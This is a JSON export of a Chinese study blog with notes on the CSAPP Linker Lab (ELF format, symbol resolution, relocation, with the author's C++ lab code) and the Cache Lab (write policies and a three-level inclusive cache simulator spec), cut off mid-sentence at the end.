
[{"content":" \u0026ldquo;I am not afraid of failing. I am afraid of succeeding in things that don\u0026rsquo;t matter.\u0026rdquo;\n\u0026mdash;William Carey\n这里就是一些杂谈，随便分享什么什么学习生活，旅游啊之类的经验。\n","date":"19 April 2025","externalUrl":null,"permalink":"/life/","section":"Life","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cem\u003e\u003cstrong\u003e\u0026ldquo;I am not afraid of failing. I am afraid of succeeding in things that don\u0026rsquo;t matter.\u0026rdquo;\u003c/strong\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u0026mdash;\u003cstrong\u003e\u003ca href=\"https://en.wikipedia.org/wiki/William_Carey_%28missionary%29\" target=\"_blank\"\u003eWilliam Carey\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e这里就是一些杂谈，随便分享什么什么学习生活，旅游啊之类的经验。\u003c/p\u003e","title":"Life","type":"life"},{"content":"","date":"19 April 2025","externalUrl":null,"permalink":"/","section":"Mio's Tea Time","summary":"","title":"Mio's Tea Time","type":"page"},{"content":" “勿以浮沙筑高塔。”\n","date":"19 April 2025","externalUrl":null,"permalink":"/csapp/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e“勿以浮沙筑高塔。”\u003c/p\u003e\u003c/blockquote\u003e","title":"","type":"csapp"},{"content":" CSAPP:LinkerLab # CSAPP上关于链接的知识我也会放在这里\u0026hellip;\u0026hellip;\n本文图片大多来源于英文原版CSAPP。\n链接机制详解 # 有多详细？这很难定义吧，是否详细应当取决于读者本来的理解,linking本身就是看起来好像就是打包一下很简单的东西，但是涉及到的知识比较复杂，应用也相当广泛。\n编译器驱动程序 # 一个静态链接过程：\n静态链接 # LD 静态链接器 输入.o文件 输出一个可执行文件\n1.符号的解析\n2.重新定位\n目标文件 # 1.可重定位\n2.可执行\n3.共享（可以动态加载进入内存并且link）\n可重定位目标文件 # 很多人开始区分不清楚.o和elf：elf就是一种格式\nELF 全称是 Executable and Linkable Format（可执行与可链接格式）\n是 Linux 系统中常用的目标文件格式（Windows 上用的是 PE 格式）\n一个 ELF 文件可以是：\n可重定位目标文件（Relocatable Object File） → .o 文件 可执行文件（Executable File） → 如通过链接生成的可执行程序 共享库文件（Shared Object File） → .so 文件 核心转储文件（Core Dump） → 程序崩溃时生成的调试文件 .o 文件是用编译器（如 gcc -c）从 .c 文件生成的\n.o 文件的格式就是 ELF 格式的“可重定位目标文件”\n它通常还不包含主函数（main()），不能直接运行，需要链接成可执行文件\n一个典型的格式如下：\n.text:机器代码\n.rodata:只读data\n.data:全局静态变量\n.bss:未初始化或者初始化为0的全局静态(better save space(?))\n.symtab:符号表，函数和全局变量的信息\n符号和符号表 # 每个可重定位模块m都有一个符号表\n1.全局符号 我定义的非静态C函数和全局变量。\n2.外部符号 别人定义的非静态C函数和全局变量。\n3.局部符号 我的static函数和全局变量（.symtab不关心这些东西）,直接在stack中管理。\n所以，在C语言多文件编程中，用static保护好自己的函数和变量是好的习惯。\n符号表条目：\n每个字段都被分配到目标文件的某个section\n用 readelf 查看目标文件内容\n选项 含义 -h 查看 ELF 文件头（Header） -S 查看段表（Section Headers） -s 查看符号表（Symbol Table） -r 查看重定位信息（Relocation Info） -l 查看程序头表（Program Header） -x \u0026lt;section\u0026gt; 以十六进制查看某个段的内容 -a 查看所有信息（等价于所有选项的合集） main.c\nint sum(int *a, int n); int array[2] = {1, 2}; int main() { int val = sum(array, 2); return val; } sum.c\nint sum(int *a, int n) { int i, s = 0; for (i = 0; i \u0026lt; n; i++) { s += a[i]; } return s; } $readelf -s main.o Symbol table \u0026#39;.symtab\u0026#39; contains 6 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FILE LOCAL DEFAULT ABS main.c 2: 0000000000000000 0 SECTION LOCAL DEFAULT 1 .text 3: 0000000000000000 8 OBJECT GLOBAL DEFAULT 3 array 4: 0000000000000000 40 FUNC GLOBAL DEFAULT 1 main 5: 0000000000000000 0 NOTYPE GLOBAL DEFAULT UND sum 有点懵，务必做课后练习题进一步理解。\n符号解析 # 链接器是怎样工作的？\n对于每个输入的文件的符号表进行扫描。\n多重定义的全局符号？ # 全局\u0026mdash;》强 弱\n强符号：函数 已经初始化的全局变量\n弱符号：未初始化的全局变量\n规则：\n1.强不能重名\n2.一强多弱选强符号\n3.多个弱符号随机选择（2,3都是比较危险的情况）\n是比较好理解的部分。\n与静态库的链接？ # ​\t静态库作为存档（archieve）存放在磁盘中，可以认为是一组可重定位目标文件的集合，当我们自己的编程中引用库时就如下图所示：\n当你引用addvec时，直接复制addvec.o到可执行的文件。\n如何使用静态库解析引用？ # 对于一行编译的命令，linker会从左到右进行扫描，维护三个集合：\n1.E：维护可重定位目标文件的集合\n2.U：未解析的符号的集合\n3.D：前面输入文件的已经定义的符号的集合\nprocess：\n1.扫描过程中，若为一个目标文件f，直接放入E中，并且在U和D中更改元素（比如自己定义的符号就放到D，此时引用的静态库的符号就放到U）。\n2.若f是一个archieve，那么我们将archive中的成员和U中的元素比对，如果定义了，就把这个元素放到D中去。\n3.linker完成之后，|U| ！= 0 ，那么报错中止。\nunix\u0026gt; gcc -static ./libvector.a main2.c /tmp/cc9XH6Rp.o: In function ‘main’: /tmp/cc9XH6Rp.o(.text+0x18): undefined reference to ‘addvec’ 那么考察这样的情况，若你把静态库放到前面，那么开始就会和U中的元素比对，但是此时U中没有元素，当main.c被扫描时，此时它引用的静态库中的函数就会是undefined。\n所以我们要把库放在最后，并且要根据库之间的依赖型进行排序（拓扑排序）。\n如果有更复杂的依赖性问题，就可以多次在命令行上重复库（可以看课后题目）。\n重定位 # 合并输入模块，为每个符号分配运行时地址。\n1.重定位节和符号定义\n​\t比如把所有的.data节合并成一个节并且分配地址。\n2.重定位节中的符号引用\n​\t修改符号引用，使其指向正确的运行时地址。\n重定位条目 # 汇编器生成目标模块时生成.rel.data .rel.text 重定位条目\n重定位符号引用 # 重定位算法遍历每个section和遍历每个条目：\nforeach section s { foreach relocation entry r { refptr = s + r.offset; /* ptr to reference to be relocated */ /* relocate a PC-relative reference */ //相对地址 if (r.type == R_386_PC32) { refaddr = ADDR(s) + r.offset; /* ref’s runtime address */ *refptr = (unsigned) (ADDR(r.symbol) + *refptr - refaddr); } //绝对地址 /* relocate an absolute reference */ if (r.type == R_386_32){ *refptr = (unsigned) (ADDR(r.symbol) + *refptr); } } } 对于上面的main.o 做\nobjdump -dx main.o\nDisassembly of section .text: 0000000000000000 \u0026lt;main\u0026gt;: 0: f3 0f 1e fa endbr64 4: 55 push %rbp 5: 48 89 e5 mov %rsp,%rbp 8: 48 83 ec 10 sub $0x10,%rsp c: be 02 00 00 00 mov $0x2,%esi 11: 48 8d 05 00 00 00 00 lea 0x0(%rip),%rax # 18 \u0026lt;main+0x18\u0026gt; 14: R_X86_64_PC32 array-0x4 18: 48 89 c7 mov %rax,%rdi 1b: e8 00 00 00 00 call 20 \u0026lt;main+0x20\u0026gt; 1c: R_X86_64_PLT32 sum-0x4 20: 89 45 fc mov %eax,-0x4(%rbp) 23: 8b 45 fc mov -0x4(%rbp),%eax 26: c9 leave 27: c3 ret 这是我电脑上实际运行的结果，array和sum都是重定位PC相对引用\n重定位PC相对引用 # 1b: e8 00 00 00 00 call 20 \u0026lt;main+0x20\u0026gt; 观察这一行，e8是call的操作码，后面的00 00 00 00 都是PC相对引用的占位符。\n在重定位时，利用上述的算法，告诉我们sum在main中的偏移量，我们可以在这里调用到sum。\nTODO：具体过程。\n重定位绝对引用 # 在目标文件中直接计算并且更改。\n在我们重定位之后：\n0000000000001129 \u0026lt;main\u0026gt;: 1129: f3 0f 1e fa endbr64 112d: 48 83 ec 08 sub $0x8,%rsp 1131: be 02 00 00 00 mov $0x2,%esi 1136: 48 8d 3d d3 2e 00 00 lea 0x2ed3(%rip),%rdi # 4010 \u0026lt;array\u0026gt; 113d: e8 05 00 00 00 call 1147 \u0026lt;sum\u0026gt; 1142: 48 83 c4 08 add $0x8,%rsp 1146: c3 ret 0000000000001147 \u0026lt;sum\u0026gt;: 1147: f3 0f 1e fa endbr64 114b: ba 00 00 00 00 mov $0x0,%edx 1150: b8 00 00 00 00 mov $0x0,%eax 1155: eb 09 jmp 1160 \u0026lt;sum+0x19\u0026gt; 1157: 48 63 c8 movslq %eax,%rcx 115a: 03 14 8f add (%rdi,%rcx,4),%edx 115d: 83 c0 01 add $0x1,%eax 1160: 39 f0 cmp %esi,%eax 1162: 7c f3 jl 1157 \u0026lt;sum+0x10\u0026gt; 1164: 89 d0 mov %edx,%eax 1166: c3 ret main中113e的位置就是sum的重定位地址\n这里的值5就是重定位的值：当CPU执行call指令时，PC会指向下一条就是1142,为了执行这个指令，CPU把PC放进栈中，并且 PC += 5，也就是PC = 1147，此时，就会执行到sum的代码。\n这个逻辑是和call指令配套的，linker在🔗这两个程序的时候，就会根据重定位表，把e8之后的占位符更改成要调用的函数相对于当前PC的偏移量的大小，call会先将PC压入栈中，PC += offset，接着就会执行到目标函数。\n可执行目标文件 # 我们现在已经合成了这个：\n这是一个典型的格式。\n我们查看一下上面那个a.out的program header\nProgram Header: PHDR off 0x0000000000000040 vaddr 0x0000000000000040 paddr 0x0000000000000040 align 2**3 filesz 0x00000000000002d8 memsz 0x00000000000002d8 flags r-- INTERP off 0x0000000000000318 vaddr 0x0000000000000318 paddr 0x0000000000000318 align 2**0 filesz 0x000000000000001c memsz 0x000000000000001c flags r-- LOAD off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**12 filesz 0x00000000000005f0 memsz 0x00000000000005f0 flags r-- LOAD off 0x0000000000001000 vaddr 0x0000000000001000 paddr 0x0000000000001000 align 2**12 filesz 0x0000000000000175 memsz 0x0000000000000175 flags r-x LOAD off 0x0000000000002000 vaddr 0x0000000000002000 paddr 0x0000000000002000 align 2**12 filesz 0x00000000000000d8 memsz 0x00000000000000d8 flags r-- LOAD off 0x0000000000002df0 vaddr 0x0000000000003df0 paddr 0x0000000000003df0 align 2**12 filesz 0x0000000000000228 memsz 0x0000000000000230 flags rw- DYNAMIC off 0x0000000000002e00 vaddr 0x0000000000003e00 paddr 0x0000000000003e00 align 2**3 filesz 0x00000000000001c0 memsz 0x00000000000001c0 flags rw- NOTE off 0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3 filesz 0x0000000000000030 memsz 0x0000000000000030 flags r-- NOTE off 0x0000000000000368 vaddr 0x0000000000000368 paddr 0x0000000000000368 align 2**2 filesz 0x0000000000000044 memsz 0x0000000000000044 flags r-- 0x6474e553 off 0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3 filesz 0x0000000000000030 memsz 0x0000000000000030 flags r-- EH_FRAME off 0x0000000000002004 vaddr 0x0000000000002004 paddr 0x0000000000002004 align 2**2 filesz 0x0000000000000034 memsz 0x0000000000000034 flags r-- STACK off 0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4 filesz 0x0000000000000000 memsz 0x0000000000000000 flags rw- RELRO off 0x0000000000002df0 vaddr 0x0000000000003df0 paddr 0x0000000000003df0 align 2**0 filesz 0x0000000000000210 memsz 0x0000000000000210 flags r-- 后面的是执行的权限的问题，vaddr是开始的内存地址，memsz是总共的内存大小，off偏移量，我们要满足这样的条件：\n​\tvaddr mod align = off mod align\n这样程序执行的时候，可以有效率的传送到内存，我们会在虚拟内存的章节中学习到。\n加载可执行目标文件 # 我们可能还会有一个关于加载器的实验，继续理解这个过程。\n./prog\n​\t这样我们来运行一个自己写的程序，loader把代码和数据复制到内存中，并且跳转到内存的第一条指令或者入口点，这个复制的过程就叫 加载（Load）。\n​\t每个linux程序都有一个运行时内存映像。\n我们对于加载的描述从概念上来说是正确的，但也不是完全准确，这是有意为之。 要理解加载实际是如何工作的 ，你必须理解进程 、虚拟内存和内存映射的概念，这些我们还没有加以讨论 。在后面笫8章和笫9章中遇到这些概念时 ，我们将重新回到加载的问题上，并逐渐向你揭开它的神秘面纱。\n实验： # 本实验就是模仿ld，写一个静态的linker，类似于linux的ld工具。\n用简单的cpp就可以。\n为什么要linker：为源代码的模块化提供可以相互引用的接口（extern）。\n1.符号解析：为每个外部文件的符号引用找对应的解析。\n2.合并成一个可执行文件。\n3.重定位，修改可执行文件代码，使其指向正确的位置。\nCPU使用PC相对引用访问地址。\n重定位就是在合并之后，在这些空缺的位置填入地址。\n实验框架：\n我们要实现的就是解析和重定位这两个关键过程。\n理解关键的数据结构：\nObjectFile # 用来存储目标文件中所需的信息，其包含的成员变量及其含义如下：\nsymbolTable ：目标文件的符号表，保存其每一个符号（见下文Symbol） relocTable ：目标文件的重定位表，保存其每一个重定位条目（见下文RelocEntry） sections ：目标文件的节表，保存节名string到节的映射（见下文Section） sectionsByIdx ：目标文件的节表，保存节索引index到节指针Section*的映射 baseAddr ：目标文件在内存中的起始地址，详见test0 size ：目标文件的大小 Section # 用来存储目标文件中的一个节，其包含的成员变量及含义如下：\nname ：节名称 type ：节类型，在本实验中略 flags ：节标志，在本实验中略 info ：节附加信息，在本实验中略 index ：节下标 addr ：节的起始地址 off ：节在目标文件中的偏移量 size ：节大小 align ：节在目标文件中的对齐限制 关于type和flags的详细信息可参考[ELF文件的man手册中有关Shdr的部分](https://www.man7.org/linux/man-pages/man5/elf.5.html#:~:text=Section header (Shdr))。\nSymbol # 用来存储目标文件中的一个符号，其包含的成员变量及含义如下：\nname ：符号名称，为string类型。 value ：符号值，表示符号在其所属节中的偏移量。 size ：符号大小，当符号未定义时则为0 type ：符号类型，例如符号是变量还是函数 bind ：符号绑定，例如符号为全局或局部的 visibility ：符号可见性，本实验中略 offset ：符号在目标文件中的偏移量 index ：符号相关节的节头表索引 RelocEntry # 用来存储目标文件中的一个引用产生的重定位条目，其包含的成员变量及含义如下：\nsym ：指向与该重定位条目关联的符号Symbol的指针 name ：重定位条目关联的符号名称，类型为string offset ：重定位条目在节中的偏移量 type ：重定位条目类型 addend ：常量加数，用于计算要存储到可重定位字段中的值 allObject # 用来存储所有目标文件对应的ObjectFile数据结构。\nmergedObject # 所有目标文件合并为一个后对应的ObjectFile。\n对于 绝对重定位（如 R_X86_64_64）：\n结果=符号地址+addend\\text{结果} = \\text{符号地址} + \\text{addend}结果=符号地址+addend\n对于 PC 相对重定位（如 R_X86_64_PC32）：\n结果=符号地址+addend−当前地址\\text{结果} = \\text{符号地址} + \\text{addend} - \\text{当前地址}结果=符号地址+addend−当前地址\n​ 想一想：为什么R_X86_64_32对应的addend为0，而R_X86_64_PC32不是？addend有什么实际意义？\n前面是绝对地址，我们是直接得到的，但是后面是PC相对寻址，也就是说call的时候，是相对于此时的PC的值的偏移量计算的，在找数组中的某个值的时候也非常有用。\n重定位的逻辑： # 说到重定位就要考虑到重定位表的问题，我们要如何利用重定位表修改可执行目标文件中的占位符号（0000）。\n#include \u0026#34;relocation.h\u0026#34; #include \u0026lt;sys/mman.h\u0026gt; // test0和test1都只需要进行重定位即可 // 重定位是加载这个程序之前我要修改值 void handleRela(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObject, ObjectFile \u0026amp;mergedObject, bool isPIE) { /* When there is more than 1 objects, * you need to adjust the offset of each RelocEntry */ // 合并之后，我们要更改偏移量,在大于1的情况下 if (allObject.size() \u0026gt; 1) { // 每次sum都要加上一整个节大小的偏移 uint64_t sum = 0; for (auto \u0026amp;object : allObject) { for (auto \u0026amp;rel : object.relocTable) { rel.offset += sum; } sum += object.sections[\u0026#34;.text\u0026#34;].size; } } /* in PIE executables, user code starts at 0xe9 by .text section */ /* in non-PIE executables, user code starts at 0xe6 by .text section */ // 注意 textOff 和 textAddr 的区别：textOff 是指 .text 节在 ELF 文件中存储的位置，而 textAddr 是指 .text 节被运行时加载后在内存中所处的位置。 // 这里都是mergeObject的位置 uint64_t userCodeStart = isPIE ? 0xe9 : 0xe6; uint64_t textOff = mergedObject.sections[\u0026#34;.text\u0026#34;].off + userCodeStart; uint64_t textAddr = mergedObject.sections[\u0026#34;.text\u0026#34;].addr + userCodeStart; for (auto \u0026amp;object : allObject) { for (auto \u0026amp;rel : object.relocTable) { // 直接转换 uint64_t baseAddr = reinterpret_cast\u0026lt;uint64_t\u0026gt;(mergedObject.baseAddr); // 查看重定位的类型 // 相对寻址 if (rel.type == R_X86_64_PLT32 || rel.type == R_X86_64_PC32) { // 填入目标指令地址和当前PC的差值 + 补偿量 int val = rel.sym-\u0026gt;value - (textAddr + rel.offset) + rel.addend; // 注意这里的地址是32位的地址 *reinterpret_cast\u0026lt;int *\u0026gt;(baseAddr + textOff + rel.offset) = val; } // 这是绝对地址 else if (rel.type == R_X86_64_32) { int val = rel.sym-\u0026gt;value + rel.addend; *reinterpret_cast\u0026lt;int *\u0026gt;(baseAddr + textOff + rel.offset) = val; } else { fprintf(stderr, \u0026#34;There is something wrong...\\n\u0026#34;); } } } } 符号解析的逻辑： # 这和之前我们讨论库是怎么加载的是类似的，我们维护集合。\n看了别人的代码，为了防止有抄袭的风险，我就有部分写的比较抽象。\n#include \u0026#34;resolve.h\u0026#34; #include \u0026lt;iostream\u0026gt; #define FOUND_ALL_DEF 0 #define MULTI_DEF 1 #define NO_DEF 2 std::string errSymName; int callResolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects); void resolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects) { int ret = callResolveSymbols(allObjects); if (ret == MULTI_DEF) { std::cerr \u0026lt;\u0026lt; \u0026#34;multiple definition for symbol \u0026#34; \u0026lt;\u0026lt; errSymName \u0026lt;\u0026lt; std::endl; abort(); } else if (ret == NO_DEF) { std::cerr \u0026lt;\u0026lt; \u0026#34;undefined reference for symbol \u0026#34; \u0026lt;\u0026lt; errSymName \u0026lt;\u0026lt; std::endl; abort(); } } /* bind each undefined reference (reloc entry) to the exact valid symbol table entry * Throw correct errors when a reference is not bound to definition, * or there is more than one definition. */ // 这里我们要做三件事情1.找未定义的符号2.多重定义3.把弱符号绑定到强符号上面去 int callResolveSymbols(std::vector\u0026lt;ObjectFile\u0026gt; \u0026amp;allObjects) { // if found multiple definition, set the errSymName to problematic symbol name and return MULTIDEF; // if no definition is found, set the errSymName to problematic symbol name and return NODEF; // 维护两个集合，strong和weak // 前面是name，后面是对应的*symbol std::unordered_map\u0026lt;std::string, Symbol *\u0026gt; weakMap; std::unordered_map\u0026lt;std::string, Symbol *\u0026gt; strongMap; for (auto \u0026amp;object : allObjects) { // 遍历符号表 for (auto \u0026amp;symbol : object.symbolTable) { // 找到了一个强符号 if (symbol.index != SHN_UNDEF \u0026amp;\u0026amp; symbol.index != SHN_COMMON \u0026amp;\u0026amp; symbol.bind == STB_GLOBAL) { // 已经存在，表明多重定义 if (strongMap.find(symbol.name) != strongMap.end()) { errSymName = symbol.name; return MULTI_DEF; } else { // 原来没有，直接绑定 strongMap.emplace(symbol.name, \u0026amp;symbol); } } } } // 把所有强符号绑定好了之后，再去处理弱符号 for (auto \u0026amp;object : allObjects) { for (auto \u0026amp;symbol : object.symbolTable) { if (symbol.index == SHN_COMMON \u0026amp;\u0026amp; symbol.bind == STB_GLOBAL) { // 不存在直接绑定 if (weakMap.find(symbol.name) == weakMap.end()) { weakMap.emplace(symbol.name, \u0026amp;symbol); } } } } // 处理弱符号和强符号相同的情况 for (auto it = weakMap.begin(); it != weakMap.end(); ++it) { if (strongMap.find(it-\u0026gt;first) != strongMap.end()) { it-\u0026gt;second-\u0026gt;value = strongMap[it-\u0026gt;first]-\u0026gt;value; it-\u0026gt;second-\u0026gt;index = strongMap[it-\u0026gt;first]-\u0026gt;index; } } // 遍历重定位符号表，哪些符号要重定位但是没有在map里，说明未定义的错误 // 重定位的symbol在最后检查的时候被绑定 for (auto \u0026amp;object : allObjects) { for (auto \u0026amp;rel : object.relocTable) { if (strongMap.find(rel.name) != strongMap.end()) { rel.sym = strongMap[rel.name]; } else if (weakMap.find(rel.name) != weakMap.end()) { rel.sym = weakMap[rel.name]; } else { errSymName = rel.name; return NO_DEF; } } } return FOUND_ALL_DEF; } 总之，链接是一个复杂的话题，牵扯的知识很多且杂，还有动态DLL，库打桩机制等内容，之后再做了解。\n","date":"19 April 2025","externalUrl":null,"permalink":"/csapp/csapplinkerlab/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eCSAPP:LinkerLab \n    \u003cdiv id=\"csapplinkerlab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csapplinkerlab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCSAPP上关于链接的知识我也会放在这里\u0026hellip;\u0026hellip;\u003c/p\u003e\n\u003cp\u003e本文图片大多来源于英文原版CSAPP。\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch2 class=\"relative group\"\u003e链接机制详解 \n    \u003cdiv id=\"%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#%E9%93%BE%E6%8E%A5%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e有多详细？这很难定义吧，是否详细应当取决于读者本来的理解,linking本身就是看起来好像就是打包一下很简单的东西，但是涉及到的知识比较复杂，应用也相当广泛。\u003c/p\u003e","title":"CSAPP:LinkerLab","type":"csapp"},{"content":" CSAPP:CacheLab # 本次lab分为A和B两部分，我先看情况做，并且会部分引用我校助教撰写的一些内容以及思考题，首先我们要熟悉一下Cache的工作原理，关于这一部分的内容，你也可以看我的ComputerOrgnization中的内容（写的不怎么样，你最好还是看课本，而且我还建议你做一下课本上的习题），A部分是实现一个3级Cache，实现的过程中我们应当会对Cache的工作原理更加熟悉，B部分是优化矩阵转置函数，我认为会教会我们什么是Cahce友好的代码。\n注意：以下不会从零开始讲述Cache的知识，并且不要抄袭，不要抄袭，不要抄袭。\nCache:计算机的世界无处不在的伟大思想\u0026hellip;\u0026hellip;\n熟悉：\nCacheLine的组织方式 # 可以看成是一个元素是CacheLine的二维数组。\nE = 1:直接映射\nS = 1：全相联映射\n处理写操作的方法 # cache处理写操作的流程比读取要复杂，因为写入操作涉及数据的更改，一旦涉及修改操作，就会带来各种一致性问题，因此cache需要合理的处理数据更改的时机和范围。同时还需要处理写miss的情况。我们在这里简要介绍一下有关写cache的一些问题和处理机制。\n一般而言，对于写入操作，cache一般有两种处理机制，分别是：\nwrite back（写回）：即数据的修改只发生在当前这一级cache中，通常会引入一个dirty标记位，表示cache中的数据和下一级cache（或内存）中的数据不一致，只有在当前的cacheline被evict的时候才会将数据写回到下一级cache（或内存）。 write through（写直达）：顾名思义，写入操作会同时将数据写入到当前cache和下一级cache（或内存中），因此二者的数据是同步的。 除了上述的两种策略，cache还需要确定如何处理write miss的情况，一般而言，也有两种方法：\nwrite allocate（写分配）：当发生cache miss时，需要访问下一级cache（或内存）将需要的cache line加载到当前cache中，然后再修改这个cache line中的内容 no write allocate（写不分配）：当发生cache miss时，无需修改当前cache中的内容，直接写入下一级cache（或内存） 上述策略两两组合可以产生4种不同的写策略，但是一般常见的只有以下两种：\nwrite back/write allocate：即写回+写分配策略（图片来自wiki）\nwrite through/no write allocate：即写直达+写不分配策略\nQ：为什么没有写回和写不分配的操作？\nA：试想一下这样的情况：有二级缓存L1和L2,我们在L1写某个内存时发生了CacheMiss，假如我们写这个的概率很高，那么这块内存应该加载到L1才更加合理，但是每次都会发生CacheMiss，这不符合时间局部性的要求。另外一种方式也可以这样思考一下。\n多级cache的包含准则(inclusion policy) # 这是本Lab的重中之重，请务必仔细理解。\n包含性策略：更高层次的，访问速度更快的cache包含的内容是下层cache的一个子集。\n现代处理器中的 L1 和 L2 Cache 可能采用不同的 一致性策略，主要有：\n包容式（Inclusive）Cache：L2 必须包含 L1 中的所有数据。 非包容式（Non-Inclusive）Cache：L1 和 L2 不必强制包含相同数据，可以各自缓存不同的数据。 独占式（Exclusive）Cache：L1 和 L2 不共享数据，数据只存在一个层级。 如上图的一个模拟情况：\n多余不再赘述，我们只需要注意这样两点：\n1.上层的存储不断Cache Miss时，直到找到没有Cache Miss的这样一层，接着要把这个数据加载到之前Cache Miss的每一层。\n2.当下层的存储发生Cache Evict时，我们要把这一层之上的所有这个数据置为无效，显然，对于Inclusive Policy，如果不驱逐就不满足子集条件。\n三级Cache模拟器 # 我们要实现这样一个Cache：\nL1分为L1D（数据读写）和L1I（指令读取）两个分离的cache，并且L1I是只读的。\nL1和L2为每个核心私有\nL2为unfied cache，也就是会同时存储指令和数据\nL3为unfied cache，且所有核心共享\n每个Cache的具体配置，方便查阅：\n每个cache的具体配置如下：\nL1D(I) cache size: 64B set: 4 associativity: 2-way cache line size: 8B write policy: write back + write allocate L2 cache size: 256B set: 8 associativity: 4-way cache line size: 8B write poliy: write back + write allocate inclusion policy: inclusive L3 cache size: 2KB set: 16 associativity: 8-way cache line size: 16B write policy: write back + write allocate inclusion policy: inclusive 我们实现单核的CPU中的缓存机制，不考虑并发访问和与核心的缓存一致性问题。\n小小吐槽一下：我们学校的助教简直已经把lab喂到嘴里了，把一整个lab变成了leetcode一样的核心代码模式，这样不好，但是门槛会变低。\n（对不起，误会了，还是挺难的\u0026hellip;\u0026hellip;）\n先读一下定义的头文件：\n/* * cachelab.h - Prototypes for Cache Lab helper functions */ #ifndef CACHE_LAB_H #define CACHE_LAB_H #include \u0026lt;stdbool.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define L1_SET_NUM 4 #define L1_LINE_NUM 2 #define L1_CACHELINE_SIZE 8 #define L2_SET_NUM 8 #define L2_LINE_NUM 4 #define L2_CACHELINE_SIZE 8 #define L3_SET_NUM 16 #define L3_LINE_NUM 8 #define L3_CACHELINE_SIZE 16 #define ADDRESS_LENGTH 64 #define MAX_TRANS_FUNCS 100 //核心的CacheLine是一个结构体 typedef struct { bool valid; bool dirty; uint64_t tag; uint64_t latest_used; // for LRU } CacheLine; typedef struct trans_func { void (*func_ptr)(int M, int N, int[N][M], int[M][N]); char *description; char correct; unsigned int num_hits; unsigned int num_misses; unsigned int num_evictions; } trans_func_t; // defined in csim.c extern CacheLine l1dcache[L1_SET_NUM][L1_LINE_NUM]; // L1 Instruction Cache extern CacheLine l1icache[L1_SET_NUM][L1_LINE_NUM]; // L2 Unified Cache extern CacheLine l2ucache[L2_SET_NUM][L2_LINE_NUM]; // L2 Unified Cache extern CacheLine l3ucache[L3_SET_NUM][L3_LINE_NUM]; /* Fill the matrix with data */ void initMatrix(int M, int N, int A[N][M], int B[M][N]); /* The baseline trans function that produces correct results. */ void correctTrans(int M, int N, int A[N][M], int B[M][N]); /* Add the given function to the function list */ void registerTransFunction(void (*trans)(int M, int N, int[N][M], int[M][N]), char *desc); #endif 实现的时候我们按照如下的顺序（程序框图,假设我们在访问第i级Cache）：\n根据内存地址得到相应的tag，set字段的值 检查第 i 级cache是否命中 如果命中，跳到第8步 否则，继续访问下一级cache（或内存）获取数据 在本级cache对应的set中找一个invalid的cache line，用于放置从下一级cache（或内存）加载的cache line，如果有多个invalid的cache line，选择下标最小的一个，然后跳到第8步 如果在第5步对应的set已满，你需要首先evict一个cache line，evict的过程使用LRU算法，如果evict的cache line是dirty的，你需要首先将其写入到下一级缓存（或内存） 由于inclusive policy，你可能需要back invalidation第 i - 1 级cache中的cache line 设置这个cache line对应的tag字段，LRU字段和valid字段 如果访问模式是写操作，设置dirty字段 返回 给了我们一个例子，我来看看\u0026hellip;\u0026hellip;\ncache的访问trace依次为：\nRead a Read b Read a Write b Read c Write a Read d Read c Write b Write c Read e Read f Read b Read d 画一画吧，这个还是挺复杂的，最复杂的地方就在于驱逐的时候Back Invalidation的逻辑。\n助教给出的一些注意事项：\n在访问cache之前，你需要正确的初始化所有的cache line, 换句话说，你需要把所有的字段全部初始化为0\n你可以假设，对于单个cache的访问，不会出现跨两个cache line的情况，换句话说，你可以忽略cacheAccess函数中的第三个参数\n对于M类型的访问，你可以等价的将他看作为一次读取和一次写入\n需要注意的是，L2和L3 cache会同时包含指令和数据\n你可以假设指令和数据不会访问同一块内存，换句话说，你可以假设L2中的某个cache line不会同时出现在L1D cache和L1I cache中\n这里TMD是这样的么，我假设访问一块内存之后就过了一堆样例（也有可能是我误人子弟了。。。。。。）\n本次实验仅要求模拟cache访问，因此你无需关心具体的写入数据\n你可以使用位运算相关技巧从传入的地址中提取出tag，set，block等信息\n你可以使用位运算相关技巧根据tag，set，block的信息拼接出内存地址\n在加载一条cache line时，你需要在当前cache set中找出一条可用的cache line, 换句话说，你需要找到一条valid字段为false的cache line。如果有多条可用的cache line，你需要选择下标最小的一个\n你需要严格使用LRU算法来找到需要evict的cache line\n你可以简单使用循环的方式来暴力实现LRU，而不考虑复杂度的问题，为此，你可以维护一个全局时钟并且仔细的设置cache 